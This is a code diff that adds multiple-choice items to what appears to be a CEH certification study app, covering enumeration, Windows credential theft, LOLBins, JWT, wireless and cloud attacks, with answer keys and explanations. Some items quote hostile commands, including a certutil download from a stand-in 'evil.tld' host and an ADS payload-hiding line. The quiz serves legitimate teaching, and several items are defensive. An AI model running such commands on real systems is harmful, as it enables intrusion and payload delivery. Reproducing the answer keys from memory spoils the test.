@@ -430,6 +430,28 @@ const DAY_04: Day = {
       c: 1,
       why: "AXFR copies the entire zone. An attacker learns every record without any other probing.",
     },
+    {
+      q: "An LDAP query against an AD domain controller succeeds with no credentials. Which is the most exposed?",
+      choices: [
+        "Domain admin password hashes",
+        "Domain user list, group memberships, OU structure",
+        "Kerberos service tickets for all users",
+        "GPO local-admin passwords",
+      ],
+      c: 1,
+      why: "Anonymous / null-bind LDAP exposes directory metadata — usernames, groups, OUs. That's the username list you need to feed into AS-REP roasting and password spraying.",
+    },
+    {
+      q: "On an SMTP server, the `VRFY` and `EXPN` commands are dangerous because:",
+      choices: [
+        "They allow SMTP smuggling",
+        "They reveal whether a username exists on the server — username enumeration",
+        "They downgrade STARTTLS",
+        "They bypass SPF records",
+      ],
+      c: 1,
+      why: "VRFY returns whether an account is real. Defense: disable both verbs (`smtpd_disable_vrfy_command = yes` in Postfix).",
+    },
   ],
 };
 
@@ -511,6 +533,17 @@ const DAY_05: Day = {
       c: 2,
       why: "CVSS v3 bands: 0.1-3.9 Low · 4.0-6.9 Medium · 7.0-8.9 High · 9.0-10.0 Critical. 8.1 sits in High. CVE-2017-0144 (EternalBlue) is the canonical example.",
     },
+    {
+      q: "An nmap scan returns:\n  22/tcp  open  ssh    OpenSSH 8.4\n  80/tcp  open  http   Apache 2.4.49\n  445/tcp open  microsoft-ds Samba 4.13.17\nWhich is the highest-priority target for follow-up?",
+      choices: [
+        "Port 22 — try password spraying against root",
+        "Port 80 — Apache 2.4.49 has CVE-2021-41773 (path traversal + RCE)",
+        "Port 445 — try EternalBlue against Samba",
+        "Port 22 — SSH 8.4 has CVE-2024-6387 regreSSHion",
+      ],
+      c: 1,
+      why: "Apache 2.4.49 is the textbook CVE-2021-41773 path-traversal-to-RCE finding. EternalBlue (CVE-2017-0144) hits Windows SMB, not Samba; OpenSSH 8.4 predates regreSSHion (CVE-2024-6387 hits 8.5-9.7).",
+    },
   ],
 };
 
@@ -583,6 +616,39 @@ const DAY_06: Day = {
       choices: ["Kerberos AS-REQ", "NTLM challenge-response", "OAuth 2.0", "PAM"],
       c: 1,
       why: "NTLM challenge-response uses the hash directly. PtH passes the captured hash without needing the plaintext password.",
+    },
+    {
+      q: "On a Windows DC, where do every domain user's NTLM hashes live?",
+      choices: [
+        "C:\\Windows\\System32\\config\\SAM",
+        "C:\\Windows\\NTDS\\NTDS.dit",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "Active Directory's secrets are in /etc/krb5.keytab",
+      ],
+      c: 1,
+      why: "NTDS.dit is the AD database. `secretsdump.py -just-dc` or `ntdsutil ifm` extracts the hashes — the classic DCSync workflow.",
+    },
+    {
+      q: "On NTFS, an attacker hides a payload via Alternate Data Streams (ADS) — e.g. `type evil.exe > notepad.exe:hidden.exe`. What's the load-bearing exam fact about ADS?",
+      choices: [
+        "Files in ADS can't execute",
+        "Standard `dir` does not show ADS streams; use `dir /R` or `streams.exe`",
+        "ADS only works on FAT32",
+        "Defender removes all ADS on save",
+      ],
+      c: 1,
+      why: "ADS is a 30-year-old Windows feature CEH still loves. The exam asks whether you can list / detect streams — `dir /R` is the answer.",
+    },
+    {
+      q: "Which steganography technique hides data by tweaking the least-significant bit of every pixel byte?",
+      choices: [
+        "Frequency-domain DCT embed",
+        "Spread-spectrum",
+        "LSB substitution",
+        "Whitespace stego",
+      ],
+      c: 2,
+      why: "LSB substitution is the canonical image-steg method. Detection is statistical (`stegdetect`, `zsteg`). LSB carries up to 1/8 of the cover image's size in payload.",
     },
   ],
 };
@@ -661,6 +727,29 @@ const DAY_07: Day = {
       c: 1,
       why: "ARP is unauthenticated by design. Send a gratuitous reply, the receiver updates its table.",
     },
+    {
+      q: "An attacker on a compromised endpoint runs `certutil.exe -urlcache -split -f https://evil.tld/p.exe`. What is this an example of?",
+      choices: [
+        "DLL sideloading",
+        "Living-off-the-land binary (LOLBin) abuse — using a signed Microsoft binary to download payloads",
+        "Reflective DLL injection",
+        "AMSI bypass",
+      ],
+      c: 1,
+      why: "`certutil` is a signed Microsoft binary that lots of EDRs whitelist. LOLBin abuse uses these signed tools (certutil, bitsadmin, mshta, regsvr32) so defender allow-listing fires.",
+      domain: "system-hacking",
+    },
+    {
+      q: "A SOC analyst sees repeated gratuitous ARP replies from one MAC. The most likely detection signal is:",
+      choices: [
+        "Multiple IPs claiming the same MAC address in the ARP cache",
+        "TLS handshake failure",
+        "Excessive UDP fragmentation",
+        "Spoofed source-port range on TCP",
+      ],
+      c: 0,
+      why: "ARP-spoof detection looks for the same MAC appearing on different ports / claiming different IPs. Tools like arpwatch and arp-scan flag this. Defender-side question — CEH asks ~10-15% of these.",
+    },
   ],
 };
 
@@ -729,6 +818,28 @@ const DAY_08: Day = {
       ],
       c: 0,
       why: "Once email filtering matured, attackers shifted to channels with no equivalent filter — voice.",
+    },
+    {
+      q: "After a successful authenticated session is hijacked, what's the single most effective server-side mitigation against further damage?",
+      choices: [
+        "Rotate the session ID on every privilege escalation (e.g. on login + on role change)",
+        "Increase the session ID length to 128 bits",
+        "Enable SameSite=Lax cookies",
+        "Send a daily reminder email",
+      ],
+      c: 0,
+      why: "Session ID rotation on auth state change kills fixation + many hijack windows. SameSite helps but cookies still flow on top-level navigations; length helps brute force, not theft.",
+    },
+    {
+      q: "A SOC sees one user account get 200 failed logins in 30 seconds from 200 distinct IPs. Which detection signature is most useful?",
+      choices: [
+        "Per-IP login rate limit (already evaded)",
+        "Per-account login rate limit + impossible-travel alert",
+        "Increase TLS cipher strength",
+        "Disable HTTP keep-alive",
+      ],
+      c: 1,
+      why: "Distributed credential stuffing rotates source IPs precisely to defeat per-IP limits. Per-account rate-limit + behavioral signals (impossible travel, new device fingerprint) catch this.",
     },
   ],
 };
@@ -860,6 +971,17 @@ const DAY_09: Day = {
       choices: ["A01 Broken Access Control (IDOR)", "A03 Injection", "A02 Crypto Failure", "A04 Insecure Design"],
       c: 0,
       why: "IDOR — Insecure Direct Object Reference — is the canonical A01 case. Object IDs are exposed and the app fails to check ownership server-side.",
+    },
+    {
+      q: "A JWT is signed with the header `{\"alg\":\"HS256\"}`. An attacker rewrites it to `{\"alg\":\"none\"}` and removes the signature. Which condition lets the attack succeed?",
+      choices: [
+        "The server checks `alg` against an allowlist (HS256 only)",
+        "The server trusts the header's `alg` and accepts `none` as unsigned",
+        "The JWT lacks an `exp` claim",
+        "The server uses RS256 instead of HS256",
+      ],
+      c: 1,
+      why: "The classic alg=none attack works only when the verifier honors header-supplied algorithm. Fix: enforce server-side alg allowlist; never let the token tell the verifier how to verify it.",
     },
   ],
 };
@@ -1070,6 +1192,18 @@ const DAY_11: Day = {
       why: "Misconfigured exported activities are the dominant Android client-side bug class. Any installed app can craft an intent to invoke it, bypassing the app's auth UI.",
       domain: "mobile-iot-ot",
     },
+    {
+      q: "A Bluetooth headset broadcasts as discoverable + pairable indefinitely. An attacker pairs with it and accesses the AVRCP profile. What's the canonical attack family this falls under?",
+      choices: ["Bluejacking", "Bluesnarfing", "BlueBorne", "Wardriving"],
+      c: 1,
+      why: "Bluesnarfing = pulling data from a paired device via OBEX/AVRCP. Bluejacking = sending unsolicited messages. BlueBorne = the 2017 RCE chain on Bluetooth stacks. Wardriving is Wi-Fi.",
+    },
+    {
+      q: "An attacker stands up a fake AP that responds to ANY probe request the victim's client sends, including SSIDs from saved network lists. What's this attack named?",
+      choices: ["Evil Twin", "KARMA", "WPS PIN", "Beacon flood"],
+      c: 1,
+      why: "KARMA exploits clients that probe for saved networks and connect to whatever answers. Modern OS hardening (random MACs + reduced probes) limits it but legacy clients are still vulnerable.",
+    },
   ],
 };
 
@@ -1145,6 +1279,28 @@ const DAY_12: Day = {
       ],
       c: 2,
       why: "Privileged + host mounts means escaping the container's namespace and accessing the host filesystem and kernel.",
+    },
+    {
+      q: "An S3 bucket policy has `\"Principal\": \"*\"` and `\"Action\": \"s3:ListBucket\"`. The bucket name is leaked via a public CloudFront distribution. What's the impact?",
+      choices: [
+        "None — encryption at rest still protects the data",
+        "Anyone on the internet can enumerate every object key in the bucket",
+        "Only signed AWS requests work",
+        "The bucket is read-only to the current AWS account",
+      ],
+      c: 1,
+      why: "Principal=`*` on ListBucket is the textbook \"open bucket\" misconfiguration. Object listing → object download is a one-step escalation. Defense: block public ACLs at the account level; use IAM Access Analyzer.",
+    },
+    {
+      q: "An Azure VM has a System-Assigned Managed Identity with Storage Blob Data Reader on a storage account. An attacker with code execution on the VM gets which token via the IMDS endpoint at `169.254.169.254/metadata/identity/oauth2/token`?",
+      choices: [
+        "The user's MFA token",
+        "An OAuth2 access token scoped to that managed identity — usable against any Azure resource the identity has roles on",
+        "The storage account's master key",
+        "The VM's BitLocker recovery key",
+      ],
+      c: 1,
+      why: "Azure managed identities are token-bound. Any code on the VM hits IMDS → gets an OAuth2 access token → uses it as Bearer auth on Azure APIs. Same shape as AWS IMDS, different endpoint + response format.",
     },
   ],
 };
@@ -1226,6 +1382,28 @@ const DAY_13: Day = {
       choices: ["~1.0x", "~1.33x", "~2x", "~4x"],
       c: 1,
       why: "3 bytes of input -> 4 chars of output -> 33% larger. Plus padding.",
+    },
+    {
+      q: "TLS 1.3 dropped several primitives that TLS 1.2 supported. Which of these was REMOVED?",
+      choices: [
+        "AES-GCM",
+        "ChaCha20-Poly1305",
+        "RSA key transport (static-RSA key exchange)",
+        "ECDHE key exchange",
+      ],
+      c: 2,
+      why: "TLS 1.3 enforces forward secrecy by requiring (EC)DHE ephemeral key exchange. Static-RSA was the canonical \"no PFS\" mode in 1.2 and is gone in 1.3. AES-GCM, ChaCha20-Poly1305, and ECDHE all stay.",
+    },
+    {
+      q: "HMAC-SHA256 differs from a plain SHA256 hash because:",
+      choices: [
+        "HMAC truncates the output to 16 bytes",
+        "HMAC mixes a secret key into the hash so it's a MAC, not just a digest — proves authenticity, not just integrity",
+        "HMAC uses a different compression function",
+        "HMAC is reversible",
+      ],
+      c: 1,
+      why: "A hash alone proves the data wasn't accidentally changed. HMAC proves it wasn't changed AND it came from someone with the shared secret. JWT signing, request signing, password reset tokens all use HMAC.",
     },
   ],
 };
